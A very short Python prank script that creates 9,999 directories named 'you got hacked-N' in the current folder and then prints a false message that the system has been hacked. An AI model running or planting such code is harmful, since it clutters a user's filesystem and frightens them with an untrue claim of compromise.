import os
for i in range(1, 10000):
    a = "you got hacked-" + str(i)
    os.mkdir(a)
print("System has been hacked!!!!! Check your current directory")

